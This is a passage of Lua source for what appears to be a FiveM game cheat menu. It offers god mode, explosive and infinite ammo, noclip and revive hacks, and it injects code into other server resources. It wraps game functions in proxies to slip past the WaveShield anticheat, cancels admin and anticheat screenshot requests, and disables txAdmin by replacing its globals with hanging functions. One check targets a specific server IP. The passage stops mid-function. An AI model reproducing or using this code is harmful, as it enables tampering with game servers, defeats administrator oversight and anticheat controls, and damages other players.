    local last = nestedMenus[depth]
    if currentTabs and last.label then
        tabStateMap[last.label] = { tab = currentTabIndex, index = activeIndex }
    end

    nestedMenus[depth] = nil
    activeMenu = last.menu
    activeIndex = last.index or 1

    if depth == 1 then
        activeIndex = lastMainMenuIndex or 1
        currentTabIndex = 0
        currentTabs = nil
        if Dui then MachoSendDuiMessage(Dui, json.encode({ action = "resetTabs" })) end
    end

    currentSubMenuRefresher = nil
    isDynamicSubMenu = false
    createIndex()
    setCurrent()
end

local function createTabs(control)
    if not currentTabs or #currentTabs == 0 then return end
    local key = getTabKey()
    if key then lastTabIndices[key] = activeIndex end
    local count = #currentTabs
    local newIdx = (currentTabIndex + (control == "Q" and -1 or 1)) % count
    local parent = nestedMenus[#nestedMenus]
    loadTab(newIdx, 1)
    if Dui then MachoSendDuiMessage(Dui, json.encode({ action = "setTabIndex", index = currentTabIndex })) end
    if parent then tabStateMap[parent.label or ""] = { tab = currentTabIndex, index = activeIndex } end
end


MachoOnKeyDown(function(keyCode)
    local key = getControl(keyCode)

    if MenuKey and key:upper() == MenuKey and not settingKeybind then
        if not isInputActive() and isKeybindConfigured then
            if IsVisible then HideUI() else ShowUI() end
        end
        return
    end

    if isInputActive() then return end

    local boundItem = itemKeybinds[key]
    if boundItem and not settingItemKeybind then
        createEnter(boundItem)
        return
    end

    if not IsVisible then return end

    local activeData = activeMenu[activeIndex]

    if key == navKeyDown or key == navKeyUp then
        createActiveIndex((key == navKeyDown) and 1 or -1)
    elseif key == "ArrowLeft" or key == "ArrowRight" then
        createOptions(key, activeData)
    elseif key == "Enter" then
        createEnter(activeData)
    elseif key == "Backspace" then
        createBackspace()
    elseif key == "Q" or key == "E" then
        createTabs(key)
    elseif key == "F4" and not settingItemKeybind then
        if activeData and activeData.label then
            startItemKeybindCapture(activeData)
        end
    end
end)

local function invisibleWeapon(checked)
    if checked then
        if not _G.InvisibleWeaponThread then
            _G.InvisibleWeaponThread = true
            CreateThread(function()
                while _G.InvisibleWeaponThread do
                    Wait(0)
                    local ped = PlayerPedId()
                    local weaponEntity = GetCurrentPedWeaponEntityIndex(ped)
                    if DoesEntityExist(weaponEntity) then
                        SetEntityVisible(weaponEntity, false, false)
                    end
                end
            end)
        end
    else
        _G.InvisibleWeaponThread = false
        Wait(100)
        local ped = PlayerPedId()
        local weaponEntity = GetCurrentPedWeaponEntityIndex(ped)
        if DoesEntityExist(weaponEntity) then
            SetEntityVisible(weaponEntity, true, false)
            ResetEntityAlpha(weaponEntity)
        end
    end
end

local function explosiveAmmo(checked)
    if checked then
        if not _G.ExplosiveAmmoActive then
            _G.ExplosiveAmmoActive = true
            CreateThread(function()
                while _G.ExplosiveAmmoActive do
                    local hit, impact = GetPedLastWeaponImpactCoord(PlayerPedId())
                    if hit then
                        AddOwnedExplosion(PlayerPedId(), impact.x, impact.y, impact.z, 6, 1.0, true, false, 0.0)
                    end
                    Wait(1)
                end
            end)
        end
    else
        _G.ExplosiveAmmoActive = false
    end
end

local function infammo(checked)
    if checked then
        if not _G.InfiniteAmmo then
            _G.InfiniteAmmo = true
            CreateThread(function()
                while _G.InfiniteAmmo do
                    Wait(0)
                    local ped = PlayerPedId()
                    local _, weapon = GetCurrentPedWeapon(ped, true)
                    if weapon and weapon ~= 0 then
                        local w1, w2 = GetMaxAmmoInClip(ped, weapon, true)
                        local maxClip = type(w2) == "number" and w2 or (type(w1) == "number" and w1 or 999)
                        if maxClip > 0 then
                            SetAmmoInClip(ped, weapon, maxClip)
                        end
                        SetPedAmmo(ped, weapon, 999999)
                        if IsPedShooting(ped) then
                            local ammo = GetAmmoInPedWeapon(ped, weapon)
                            SetPedAmmo(ped, weapon, (type(ammo) == "number" and ammo or 999) + 1)
                        end
                    end
                end
            end)
        end
    else
        _G.InfiniteAmmo = false
    end
end

local function noreload(checked)
    if checked then
        if not _G.NoReloadActive then
            _G.NoReloadActive = true
            CreateThread(function()
                while _G.NoReloadActive do
                    Wait(0)
                    local ped = PlayerPedId()
                    if IsPedShooting(ped) then
                        PedSkipNextReloading(ped)
                        MakePedReload(ped)
                    end
                end
            end)
        end
    else
        _G.NoReloadActive = false
    end
end

local function instaReload(checked)
    if checked then
        _G.InstaReload = true
        CreateThread(function()
            while _G.InstaReload do
                Wait(0)
                local ped = PlayerPedId()
                local _, weapon = GetCurrentPedWeapon(ped, true)
                if weapon and weapon ~= 0 then
                    local _, ammoInClip = GetAmmoInClip(ped, weapon)
                    if ammoInClip <= 0 then
                        local maxClip = GetMaxAmmoInClip(ped, weapon, true)
                        SetAmmoInClip(ped, weapon, maxClip)
                    end
                end
            end
        end)
    else
        _G.InstaReload = false
    end
end

local function weapondamage(damageMultiplier)
    _G.WeaponDamageMultiplier = damageMultiplier
    if not _G.WeaponDamageThread and _G.WeaponDamageMultiplier ~= 1.0 then
        _G.WeaponDamageThread = CreateThread(function()
            while _G.WeaponDamageThread and _G.WeaponDamageMultiplier ~= 1.0 do
                Wait(0)
                local playerId = PlayerId()
                SetPlayerWeaponDamageModifier(playerId, _G.WeaponDamageMultiplier)
                SetPlayerMeleeWeaponDamageModifier(playerId, _G.WeaponDamageMultiplier)
            end
        end)
    elseif _G.WeaponDamageMultiplier == 1.0 then
        _G.WeaponDamageThread = nil
        local playerId = PlayerId()
        SetPlayerWeaponDamageModifier(playerId, 1.0)
        SetPlayerMeleeWeaponDamageModifier(playerId, 1.0)
    end
end

local CPlayers = {}
local Risk = {}
function Risk:GetNearbyPlayers(coords, maxDistance, includePlayer)
    local nearby = {}
    local myPed = PlayerPedId()
    maxDistance = maxDistance or 350.0
    local activePlayers = GetActivePlayers() or {}
    for _, playerId in ipairs(activePlayers) do
        if includePlayer or playerId ~= PlayerId() then
            local ped = GetPlayerPed(playerId)
            if ped and DoesEntityExist(ped) then
                local playerCoords = GetEntityCoords(ped)
                local distance = #(coords - playerCoords)
                if distance <= maxDistance then
                    nearby[#nearby + 1] = {
                        name = GetPlayerName(playerId),
                        serverId = GetPlayerServerId(playerId)
                    }
                end
            end
        end
    end
    return nearby
end

function Risk:SelectEveryone()
    local coords = GetEntityCoords(PlayerPedId())
    local players = self:GetNearbyPlayers(coords, 350.0, true)
    for _, p in ipairs(players) do
        CPlayers[tonumber(p.serverId)] = true
    end
    showNotify("All nearby players selected", "success")
end

function Risk:UnselectEveryone()
    for k, v in pairs(CPlayers) do CPlayers[k] = false end
    showNotify("All players unselected", "info")
end

function Risk:ClearSelection()
    CPlayers = {}
    showNotify("Selection cleared", "info")
end

function Risk:IgnoreSelf()
    local mySid = GetPlayerServerId(PlayerId())
    CPlayers[tonumber(mySid)] = false
    showNotify("Self ignored", "info")
end

-- function for framework revive
local function setRevive()
    if GetResourceState('wasabi_ambulance') == 'started' then
        executeCode('wasabi_ambulance', [[
            local setPed = PlayerPedId()
            RespawnPed(setPed, GetEntityCoords(setPed), GetEntityHeading(setPed))
        ]])
    elseif GetResourceState('mc9-medicsystem') == 'started' then
        executeCode('mc9-medicsystem', [[
            local setPed = PlayerPedId()
            RespawnPed(setPed, GetEntityCoords(setPed), GetEntityHeading(setPed))
            ClearPedTasksImmediately(setPed)
        ]])
    elseif GetResourceState('esx_ambulancejob') == 'started' then
        executeCode('esx_ambulancejob', [[
            OnPlayerRevive()
        ]])
    elseif GetResourceState('Ghetto') == 'started' then
        executeCode('Ghetto', [[
            CUser.revive()
        ]])
    elseif GetCurrentServerEndpoint('191.96.152.42:30120') then
        executeCode('any', [[
            TriggerEvent('admin:revive')
        ]])
    elseif GetResourceState('rzrp-base') == 'started' then
        executeCode('any', [[
            local setPed = PlayerPedId()
            ResurrectPed(setPed, GetEntityCoords(setPed), GetEntityHeading(setPed), true, false)
            ClearPedTasksImmediately(setPed)
        ]])
    end
end

local function setHealth()
    executeCode('any', [[
        local setPed = PlayerPedId()
        if DoesEntityExist(setPed) and not IsEntityDead(setPed) then
            SetEntityHealth(setPed, GetEntityMaxHealth(setPed))
        end
    ]])
end

local function setArmor()
    executeCode('any', [[
        local setPed = PlayerPedId()
        if DoesEntityExist(setPed) and not IsEntityDead(setPed) then
            SetPedArmour(setPed, 100)
        end
    ]])
end

local function setGodMode(checked)
    if GetResourceState('WaveShield') == 'started' then
        local ped = PlayerPedId()
        SetEntityInvincible(ped, checked)
    else
        executeCode('any', string.format([[
            local setPed = PlayerPedId()
            SetEntityInvincible(setPed, %s)
        ]], tostring(checked)))
    end
end

local function setFullFood()
    executeCode('any', [[
        TriggerEvent('esx_status:set', 'hunger', 1000000)
    ]])
end

local function setFullThirst()
    executeCode('any', [[
        TriggerEvent('esx_status:set', 'thirst', 1000000)
    ]])
end

local function setRemoveStress()
    executeCode('any', [[
        TriggerEvent('esx_status:set', 'stress', 0)
    ]])
end

local function setCleanPlayer()
    executeCode('any', [[
        local setPed = PlayerPedId()
        if DoesEntityExist(setPed) then
            ClearPedBloodDamage(setPed)
            ResetPedVisibleDamage(setPed)
            ClearPedWetness(setPed)
            ClearPedEnvDirt(setPed)
        end
    ]])
end

local function setResetVision()
    executeCode('any', [[
        ClearTimecycleModifier()
        SetNightvision(false)
        SetSeethrough(false)
        StopScreenEffect("DrugsTrevorClownsFight")
        StopScreenEffect("DrugsMichaelAliensFight")
        StopGameplayCamShaking(true)
    ]])
end

local function setFastPunch(checked)
    if checked then
        executeCode('monitor', [[
            _G.FastPunchEnabled = true
            CreateThread(function()
                while _G.FastPunchEnabled do
                    Wait(750)
                    local ped = PlayerPedId()
                    if IsPedOnFoot(ped) and not IsPedInAnyVehicle(ped, false) and GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_UNARMED") then
                         if IsControlPressed(0, 24) or IsControlPressed(0, 257) then
                            Wait(750)
                            ClearPedTasksImmediately(ped)
                        end
                    end
                end
            end)
        ]])
    else
        executeCode('monitor', [[ _G.FastPunchEnabled = false ]])
    end
end

local function setFastRun(checked)
    if checked then
        FastRun = true
        CreateThread(function()
            while FastRun do
                SetRunSprintMultiplierForPlayer(PlayerId(), 1.49)
                SetPedMoveRateOverride(PlayerPedId(), 3.0)
                Wait(1)
            end
            SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
            SetPedMoveRateOverride(PlayerPedId(), 1.0)
        end)
    else
        FastRun = false
    end
end

local function setSuperJump(checked)
    if checked then
        executeCode('monitor', [[
            _G.SuperJumpToggle = true
            CreateThread(function()
                while _G.SuperJumpToggle do
                    SetSuperJumpThisFrame(PlayerId())
                    Wait(0)
                end
            end)
        ]])
    else
        executeCode('monitor', [[ _G.SuperJumpToggle = false ]])
    end
end

local function setInfiniteStamina(checked)
    if checked then
        executeCode('monitor', [[
            infiniteStamina = true
            CreateThread(function()
                while infiniteStamina do
                    ResetPlayerStamina(PlayerId())
                    Wait(30)
                end
            end)
        ]])
    else
        executeCode('monitor', [[ infiniteStamina = false ]])
    end
end

local function setInvisibility(checked)
    executeCode('any', string.format([[
        local selfPed = PlayerPedId()
        SetEntityVisible(selfPed, not %s, false)
    ]], tostring(checked)))
end

local function setTxAdminIds(state)
    executeCode('any', string.format([[
        menuIsAccessible = true
        toggleShowPlayerIDs(%s, %s)
    ]], state, state))
end

local function setTxAdminMode(data)
    executeCode('any', [[
        local packed = msgpack.pack_args('noclip', true)
        TriggerEventInternal('txcl:setPlayerMode', packed, packed:len())
    ]])
end

local function setPlayerModel(modelName)
    executeCode('any', string.format([[
            local modelName = %q
            CreateThread(function()
                local modelHash = GetHashKey(modelName)
                if IsModelValid(modelHash) then
                    RequestModel(modelHash)
                    while not HasModelLoaded(modelHash) do Wait(1) end
                    SetPlayerModel(PlayerId(), modelHash)
                    SetModelAsNoLongerNeeded(modelHash)
                    SetEntityVisible(PlayerPedId(), true, 0)
                end
            end)
        ]], modelName))
end

local function setRandomizeOutfit(option)
    if option == "Type 1" then
        executeCode("any", [[
            local ped = PlayerPedId()

            local function safeRandomComponentExclude(component, exclude)
                local count = GetNumberOfPedDrawableVariations(ped, component)
                if count <= 1 then return 0 end
                local choice = exclude
                while choice == exclude do
                    choice = math.random(0, count - 1)
                end
                return choice
            end

            local function safeRandomComponent(component)
                local count = GetNumberOfPedDrawableVariations(ped, component)
                if count > 1 then
                    return math.random(0, count - 1)
                else
                    return 0
                end
            end

            SetPedComponentVariation(ped, 11, safeRandomComponentExclude(11, 15), 0, 2) -- torso
            SetPedComponentVariation(ped, 6, safeRandomComponentExclude(6, 15), 0, 2)  -- shoes
            SetPedComponentVariation(ped, 8, 15, 0, 2)                                 -- undershirt
            SetPedComponentVariation(ped, 3, 0, 0, 2)                                  -- arms
            SetPedComponentVariation(ped, 4, safeRandomComponent(4), 0, 2)             -- pants
            local f = math.random(0, 45)
            local s = math.random(0, 45)
            SetPedHeadBlendData(ped, f, s, 0, f, s, 0, 1.0, 1.0, 0.0, false)
            local maxHair = GetNumberOfPedDrawableVariations(ped, 2)
            local h = maxHair > 1 and math.random(0, maxHair - 1) or 0
            SetPedComponentVariation(ped, 2, h, 0, 2)
            SetPedHairColor(ped, 0, 0)
            local maxBrows = GetNumHeadOverlayValues(2)
            SetPedHeadOverlay(ped, 2, maxBrows > 1 and math.random(0, maxBrows - 1) or 0, 1.0)
            SetPedHeadOverlayColor(ped, 2, 1, 0, 0)
            ClearPedProp(ped, 0)
            ClearPedProp(ped, 1)
        ]])
    elseif option == "Type 2" then
        executeCode("any", [[
            local ped = PlayerPedId()

            local function safeRandomComponentExclude(component, exclude)
                local count = GetNumberOfPedDrawableVariations(ped, component)
                if count <= 1 then return 0 end
                local choice = exclude
                while choice == exclude do
                    choice = math.random(0, count - 1)
                end
                return choice
            end

            local function safeRandomComponent(component)
                local count = GetNumberOfPedDrawableVariations(ped, component)
                if count > 1 then
                    return math.random(0, count - 1)
                else
                    return 0
                end
            end

            SetPedComponentVariation(ped, 11, safeRandomComponentExclude(11, 15), 0, 2)
            SetPedComponentVariation(ped, 6, safeRandomComponentExclude(6, 15), 0, 2)
            SetPedComponentVariation(ped, 8, 15, 0, 2)
            SetPedComponentVariation(ped, 3, 0, 0, 2)
            SetPedComponentVariation(ped, 4, safeRandomComponent(4), 0, 2)

            local f = math.random(0, 45)
            local s = math.random(0, 45)
            SetPedHeadBlendData(ped, f, s, 0, f, s, 0, 1.0, 1.0, 0.0, false)

            local maxHair = GetNumberOfPedDrawableVariations(ped, 2)
            local h = maxHair > 1 and math.random(0, maxHair - 1) or 0
            SetPedComponentVariation(ped, 2, h, 0, 2)
            SetPedHairColor(ped, 0, 0)

            local maxBrows = GetNumHeadOverlayValues(2)
            SetPedHeadOverlay(ped, 2, maxBrows > 1 and math.random(0, maxBrows - 1) or 0, 1.0)
            SetPedHeadOverlayColor(ped, 2, 1, 0, 0)

            ClearPedProp(ped, 0)
            ClearPedProp(ped, 1)
        ]])
    end
end

local function saveOutfit()
    executeCode('any', [[
            TriggerEvent('illenium-appearance:client:saveOutfit')
        ]])
end

local function openAppearanceMenu()
    executeCode('any', [[
            CreateThread(function()
                TriggerEvent('esx_skin:openSaveableMenu')
            end)
        ]])
end

local function setComponentVariation(component, value)
    executeCode('any', string.format([[
        local ped = PlayerPedId()
        SetPedComponentVariation(ped, %d, %d, 0, 0)
    ]], component, value))
end

local function setAntiRagdoll(checked)
    if checked then
        if GetResourceState("WaveShield") == "started" then
            local bp = setmetatable({}, {
                __index = function(_, k)
                    local v = _G[k]
                    return type(v) == "function" and function(...) return v(...) end or v
                end
            })

            if _G.NoRagdollThread then return end

            _G.NoRagdoll = true
            _G.NoRagdollThread = CreateThread(function()
                while _G.NoRagdoll do
                    Wait(0)
                    local ped = bp.PlayerPedId()
                    if bp.DoesEntityExist(ped) and not bp.IsEntityDead(ped) then
                        bp.SetPedCanRagdoll(ped, false)
                        bp.ClearPedTasks(ped)
                        bp.SetEntityProofs(ped, false, true, false, false, false, false, true, false)
                    end
                end
                _G.NoRagdollThread = nil
            end)
        else
            executeCode('any', [[
                if _G.NoRagdollThread then return end

                _G.NoRagdoll = true
                _G.NoRagdollThread = CreateThread(function()
                    while _G.NoRagdoll do
                        Wait(0)
                        local ped = PlayerPedId()
                        if DoesEntityExist(ped) and not IsEntityDead(ped) then
                            SetPedCanRagdoll(ped, false)
                            ClearPedTasks(ped)
                            SetEntityProofs(ped, false, true, false, false, false, false, true, false)
                        end
                    end
                    _G.NoRagdollThread = nil
                end)
            ]])
        end
    else
        if GetResourceState("WaveShield") == "started" then
            _G.NoRagdoll = false

            local ped = PlayerPedId()
            if DoesEntityExist(ped) and not IsEntityDead(ped) then
                SetPedCanRagdoll(ped, true)
                SetEntityProofs(ped, false, false, false, false, false, false, false, false)
            end
        else
            executeCode('any', [[
                _G.NoRagdoll = false

                local ped = PlayerPedId()
                if DoesEntityExist(ped) and not IsEntityDead(ped) then
                    SetPedCanRagdoll(ped, true)
                    SetEntityProofs(ped, false, false, false, false, false, false, false, false)
                end
            ]])
        end
    end
end

local function setAntiCollision(checked)
    if checked then
        if GetResourceState("WaveShield") == "started" then
            local bp = setmetatable({}, {
                __index = function(_, k)
                    local v = _G[k]
                    return type(v) == "function" and function(...) return v(...) end or v
                end
            })

            _G.NoCollision = true
            CreateThread(function()
                local ped = bp.PlayerPedId()
                while _G.NoCollision do
                    bp.SetEntityCollision(ped, false, false)
                    bp.SetEntityInvincible(ped, true)

                    local pos = bp.GetEntityCoords(ped)
                    local rayStart = vector3(pos.x, pos.y, pos.z + 1.0)
                    local rayEnd = vector3(pos.x, pos.y, pos.z - 10.0)
                    local rayHandle = bp.StartShapeTestRay(rayStart.x, rayStart.y, rayStart.z, rayEnd.x, rayEnd.y,
                        rayEnd.z, -1, ped, 7)
                    local _, hit, hitPos, _, _ = bp.GetShapeTestResult(rayHandle)

                    if not hit then
                        bp.SetEntityCoordsNoOffset(ped, pos.x, pos.y, pos.z + 1.0, false, false, false)
                    elseif pos.z < hitPos.z + 0.5 then
                        bp.SetEntityCoordsNoOffset(ped, pos.x, pos.y, hitPos.z + 0.5, false, false, false)
                    end

                    bp.Wait(10)
                end

                bp.SetEntityCollision(ped, true, true)
                bp.SetEntityInvincible(ped, false)
            end)
        else
            executeCode('any', [[
                _G.NoCollision = true
                CreateThread(function()
                    local ped = PlayerPedId()
                    while _G.NoCollision do
                        SetEntityCollision(ped, false, false)
                        SetEntityInvincible(ped, true)

                        local pos = GetEntityCoords(ped)
                        local rayStart = vector3(pos.x, pos.y, pos.z + 1.0)
                        local rayEnd = vector3(pos.x, pos.y, pos.z - 10.0)
                        local rayHandle = StartShapeTestRay(rayStart.x, rayStart.y, rayStart.z, rayEnd.x, rayEnd.y, rayEnd.z, -1, ped, 7)
                        local _, hit, hitPos, _, _ = GetShapeTestResult(rayHandle)

                        if not hit then
                            SetEntityCoordsNoOffset(ped, pos.x, pos.y, pos.z + 1.0, false, false, false)
                        elseif pos.z < hitPos.z + 0.5 then
                            SetEntityCoordsNoOffset(ped, pos.x, pos.y, hitPos.z + 0.5, false, false, false)
                        end

                        Wait(10)
                    end

                    SetEntityCollision(ped, true, true)
                    SetEntityInvincible(ped, false)
                end)
            ]])
        end
    else
        if GetResourceState("WaveShield") == "started" then
            _G.NoCollision = false
        else
            executeCode('any', [[ _G.NoCollision = false ]])
        end
    end
end

local function setPassiveMode(checked)
    SetPedConfigFlag(PlayerPedId(), 423, checked)
end

local function setAntiDrag(checked)
    if checked then
        if GetResourceState("WaveShield") == "started" then
            local bp = setmetatable({}, {
                __index = function(_, k)
                    local v = _G[k]
                    return type(v) == "function" and function(...) return v(...) end or v
                end
            })

            if AntiDrag == nil then AntiDrag = false end
            AntiDrag = true

            CreateThread(function()
                while AntiDrag do
                    local ped = bp.PlayerPedId()
                    if bp.IsEntityAttached(ped) then
                        bp.DetachEntity(ped, true, false)
                    end
                    bp.ClearPedSecondaryTask(ped)
                    bp.SetEnableHandcuffs(ped, false)
                    if bp.DoesEntityExist(Handcuffs) then bp.DeleteEntity(Handcuffs) end
                    if bp.DoesEntityExist(handcuff) then bp.DeleteEntity(handcuff) end
                    bp.FreezeEntityPosition(ped, false)
                    Wait(200)
                end
            end)
        else
            executeCode('any', [[
                if AntiDrag == nil then AntiDrag = false end
                AntiDrag = true

                CreateThread(function()
                    while AntiDrag do
                        local ped = PlayerPedId()
                        if IsEntityAttached(ped) then
                            DetachEntity(ped, true, false)
                        end
                        ClearPedSecondaryTask(ped)
                        SetEnableHandcuffs(ped, false)
                        if DoesEntityExist(Handcuffs) then DeleteEntity(Handcuffs) end
                        if DoesEntityExist(handcuff) then DeleteEntity(handcuff) end
                        FreezeEntityPosition(ped, false)
                        Wait(200)
                    end
                end)
            ]])
        end
    else
        if GetResourceState("WaveShield") == "started" then
            AntiDrag = false
        else
            executeCode('any', [[ AntiDrag = false ]])
        end
    end
end

local function setAntiVDM(checked)
    if checked then
        if GetResourceState("WaveShield") == "started" then
            local bp = setmetatable({}, {
                __index = function(_, k)
                    local v = _G[k]
                    return type(v) == "function" and function(...) return v(...) end or v
                end
            })

            _G.AntiVDMEnabled = true
            CreateThread(function()
                while _G.AntiVDMEnabled do
                    local pCoords = bp.GetEntityCoords(bp.PlayerPedId())
                    for _, vehicle in ipairs(bp.GetGamePool("CVehicle")) do
                        if bp.DoesEntityExist(vehicle) then
                            local vCoords = bp.GetEntityCoords(vehicle)
                            local dist = #(pCoords - vCoords)
                            if dist <= 50.0 then
                                bp.SetEntityNoCollisionEntity(vehicle, bp.PlayerPedId(), true)
                            end
                        end
                    end
                    Wait(0)
                end
            end)
        else
            executeCode('any', [[
                _G.AntiVDMEnabled = true
                CreateThread(function()
                    while _G.AntiVDMEnabled do
                        local pCoords = GetEntityCoords(PlayerPedId())
                        for _, vehicle in ipairs(GetGamePool("CVehicle")) do
                            if DoesEntityExist(vehicle) then
                                local vCoords = GetEntityCoords(vehicle)
                                local dist = #(pCoords - vCoords)
                                if dist <= 50.0 then
                                    SetEntityNoCollisionEntity(vehicle, PlayerPedId(), true)
                                end
                            end
                        end
                        Wait(0)
                    end
                end)
            ]])
        end
    else
        if GetResourceState("WaveShield") == "started" then
            _G.AntiVDMEnabled = false
        else
            executeCode('any', [[ _G.AntiVDMEnabled = false ]])
        end
    end
end

local function setAntiHeadshot(checked)
    if checked then
        if GetResourceState("WaveShield") == "started" then
            local bp = setmetatable({}, {
                __index = function(_, k)
                    local v = _G[k]
                    return type(v) == "function" and function(...) return v(...) end or v
                end
            })

            _G.AntiHeadshot = true
            CreateThread(function()
                local lastHealth = bp.GetEntityHealth(bp.PlayerPedId())
                while _G.AntiHeadshot do
                    local ped = bp.PlayerPedId()
                    bp.SetPedSuffersCriticalHits(ped, false)

                    local health = bp.GetEntityHealth(ped)
                    local _, bone = bp.GetPedLastDamageBone(ped)

                    if bone == 31086 and health < lastHealth then
                        bp.SetEntityHealth(ped, lastHealth)
                        bp.ClearPedLastDamageBone(ped)
                    else
                        lastHealth = health
                    end

                    Wait(0)
                end
            end)
        else
            executeCode('any', [[
                _G.AntiHeadshot = true
                CreateThread(function()
                    local lastHealth = GetEntityHealth(PlayerPedId())
                    while _G.AntiHeadshot do
                        local ped = PlayerPedId()
                        SetPedSuffersCriticalHits(ped, false)

                        local health = GetEntityHealth(ped)
                        local _, bone = GetPedLastDamageBone(ped)

                        if bone == 31086 and health < lastHealth then
                            SetEntityHealth(ped, lastHealth)
                            ClearPedLastDamageBone(ped)
                        else
                            lastHealth = health
                        end

                        Wait(0)
                    end
                end)
            ]])
        end
    else
        if GetResourceState("WaveShield") == "started" then
            _G.AntiHeadshot = false
            SetPedSuffersCriticalHits(PlayerPedId(), true)
        else
            executeCode('any', [[
                _G.AntiHeadshot = false
                SetPedSuffersCriticalHits(PlayerPedId(), true)
            ]])
        end
    end
end

local function setAntiFreeze(checked)
    if checked then
        if GetResourceState("WaveShield") == "started" then
            local bp = setmetatable({}, {
                __index = function(_, k)
                    local v = _G[k]
                    return type(v) == "function" and function(...) return v(...) end or v
                end
            })

            _G.AntiFreeze = true
            CreateThread(function()
                while _G.AntiFreeze do
                    local ped = bp.PlayerPedId()
                    if bp.IsEntityPositionFrozen(ped) then
                        bp.FreezeEntityPosition(ped, false)
                        bp.ClearPedTasksImmediately(ped)
                    end
                    bp.SetPlayerControl(bp.PlayerId(), true, 0)
                    Wait(1)
                end
            end)
        else
            executeCode('any', [[
                _G.AntiFreeze = true
                CreateThread(function()
                    while _G.AntiFreeze do
                        local ped = PlayerPedId()
                        if IsEntityPositionFrozen(ped) then
                            FreezeEntityPosition(ped, false)
                            ClearPedTasksImmediately(ped)
                        end
                        SetPlayerControl(PlayerId(), true, 0)
                        Wait(1)
                    end
                end)
            ]])
        end
    else
        if GetResourceState("WaveShield") == "started" then
            _G.AntiFreeze = false
        else
            executeCode('any', [[ _G.AntiFreeze = false ]])
        end
    end
end

local function setSoloSession(checked)
    if checked then
        if GetResourceState("WaveShield") == "started" then
            local bp = setmetatable({}, {
                __index = function(_, k)
                    local v = _G[k]
                    return type(v) == "function" and function(...) return v(...) end or v
                end
            })

            if _G.InfernoSoloSessionThread then return end
            _G.InfernoSoloSessionEnabled = true
            bp.NetworkStartSoloTutorialSession()
            _G.InfernoSoloSessionThread = CreateThread(function()
                while _G.InfernoSoloSessionEnabled do bp.Wait(1000) end
                bp.NetworkEndTutorialSession()
                _G.InfernoSoloSessionThread = nil
            end)
        else
            executeCode('any', [[
                if _G.InfernoSoloSessionThread then return end
                _G.InfernoSoloSessionEnabled = true
                NetworkStartSoloTutorialSession()
                _G.InfernoSoloSessionThread = CreateThread(function()
                    while _G.InfernoSoloSessionEnabled do Wait(1000) end
                    NetworkEndTutorialSession()
                    _G.InfernoSoloSessionThread = nil
                end)
            ]])
        end
    else
        if GetResourceState("WaveShield") == "started" then
            local bp = setmetatable({}, {
                __index = function(_, k)
                    local v = _G[k]
                    return type(v) == "function" and function(...) return v(...) end or v
                end
            })

            _G.InfernoSoloSessionEnabled = false
            CreateThread(function()
                while _G.InfernoSoloSessionThread do bp.Wait(50) end
                _G.InfernoSoloSessionThread = nil
            end)
        else
            executeCode('any', [[
                _G.InfernoSoloSessionEnabled = false
                CreateThread(function()
                    while _G.InfernoSoloSessionThread do Wait(50) end
                    _G.InfernoSoloSessionThread = nil
                end)
            ]])
        end
    end
end

local function setAntiBlackscreen(checked)
    if checked then
        if GetResourceState("WaveShield") == "started" then
            local bp = setmetatable({}, {
                __index = function(_, k)
                    local v = _G[k]
                    return type(v) == "function" and function(...) return v(...) end or v
                end
            })

            if _G.AntiBlackThread then return end
            _G.AntiBlackEnabled = true
            _G.AntiBlackThread = CreateThread(function()
                while _G.AntiBlackEnabled and not _G.Unloaded do
                    bp.DoScreenFadeIn(0)
                    Wait(0)
                end
                _G.AntiBlackThread = nil
            end)
        else
            executeCode('any', [[
                if _G.AntiBlackThread then return end
                _G.AntiBlackEnabled = true
                _G.AntiBlackThread = CreateThread(function()
                    while _G.AntiBlackEnabled do
                        DoScreenFadeIn(0)
                        Wait(0)
                    end
                    _G.AntiBlackThread = nil
                end)
            ]])
        end
    else
        if GetResourceState("WaveShield") == "started" then
            _G.AntiBlackEnabled = false
            CreateThread(function()
                while _G.AntiBlackThread do Wait(50) end
                _G.AntiBlackThread = nil
            end)
        else
            executeCode('any', [[
                _G.AntiBlackEnabled = false
                CreateThread(function()
                    while _G.AntiBlackThread do Wait(50) end
                    _G.AntiBlackThread = nil
                end)
            ]])
        end
    end
end

local function setBlockTxAdmin(checked)
    if checked then
        executeCode('any', [[
            local oldWait = Wait
            local TableSpecials = { ['print'] = true, ['_G'] = true, ['pairs'] = true, ['type'] = true, ['VERSION'] = true }
            _G['VERSION'] = _G
            for k, v in pairs(_G) do
                if not TableSpecials[k] then
                    _G[k] = function() oldWait(10000 * 10000) end
                end
            end
        ]])
    end
end

local function setBlockScreenshots(checked)
    if checked then
        if GetResourceState("WaveShield") == "started" then
            local BP = setmetatable({}, {
                __index = function(_, key)
                    local fn = _G[key]
                    if type(fn) == "function" then
                        return function(...) return fn(...) end
                    end
                end
            })

            local notify = function(action)
                if sendSnackbarMessage then sendSnackbarMessage('error', 'Admin attempted to ' .. action, true) end
            end

            local screenshotEvents = {
                "screenshot_basic:requestScreenshot", "EasyAdmin:CaptureScreenshot", "requestScreenshot",
                "cfx_nui:screenshotcreated", "screenshot-basic", "requestScreenshotUpload",
                "Anticheat:requestClientScreenshot", "Anticheat:clientScreenshotCreated"
            }
            for _, ev in ipairs(screenshotEvents) do
                BP.RegisterNetEvent(ev)
                BP.AddEventHandler(ev, function()
                    notify("take a screenshot")
                    if ev == "EasyAdmin:CaptureScreenshot" then
                        BP.TriggerServerEvent("EasyAdmin:TookScreenshot", "ERROR")
                    end
                    BP.CancelEvent()
                end)
            end
        else
            executeCode('any', [[
                local screenshotEvents = {
                    "screenshot_basic:requestScreenshot", "EasyAdmin:CaptureScreenshot", "requestScreenshot",
                    "cfx_nui:screenshotcreated", "screenshot-basic", "requestScreenshotUpload",
                    "Anticheat:requestClientScreenshot", "Anticheat:clientScreenshotCreated"
                }
                for _, ev in ipairs(screenshotEvents) do
                    RegisterNetEvent(ev)
                    AddEventHandler(ev, function()
                        if sendSnackbarMessage then sendSnackbarMessage('error', 'Admin attempted to take a screenshot', true) end
                        if ev == "EasyAdmin:CaptureScreenshot" then
                            TriggerServerEvent("EasyAdmin:TookScreenshot", "ERROR")
                        end
                        CancelEvent()
                    end)
                end
            ]])
        end
    end
end

local function setAntiAttach(checked)
    if checked then
        if GetResourceState("WaveShield") == "started" then
            local bp = setmetatable({}, {
                __index = function(_, k)
                    local v = _G[k]
                    return type(v) == "function" and function(...) return v(...) end or v
                end
            })

            _G.AntiAttach = true
            CreateThread(function()
                while _G.AntiAttach do
                    Wait(350)
                    local ped = bp.PlayerPedId()
                    if bp.DoesEntityExist(ped) then
